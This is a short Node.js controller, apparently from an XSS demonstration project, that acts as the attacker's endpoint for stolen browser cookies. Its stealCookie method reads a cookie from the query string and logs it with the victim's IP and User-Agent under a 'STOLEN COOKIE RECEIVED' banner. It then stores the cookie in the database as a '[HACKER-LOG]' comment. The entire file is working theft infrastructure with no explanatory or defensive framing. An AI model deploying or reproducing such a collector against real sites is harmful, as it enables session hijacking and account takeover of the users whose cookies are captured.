const Comment = require("../models/Comment");

class ExploitController {
    static async stealCookie(req, res) {
        try {
            const stolenCookie = req.query.cookie;
            const timestamp = new Date().toISOString();

            console.log("🚨 STOLEN COOKIE RECEIVED:");
            console.log("Timestamp:", timestamp);
            console.log("Cookie:", stolenCookie);
            console.log("IP:", req.ip);
            console.log("User-Agent:", req.get("User-Agent"));
            console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

            // Lưu vào database để xem log
            await Comment.create(
                "[HACKER-LOG]",
                `Stolen Cookie: ${stolenCookie} at ${timestamp}`
            );

            res.send("Cookie logged successfully");
        } catch (error) {
            console.error("Error logging stolen cookie:", error);
            res.status(500).send("Error logging cookie");
        }
    }
}

module.exports = ExploitController;
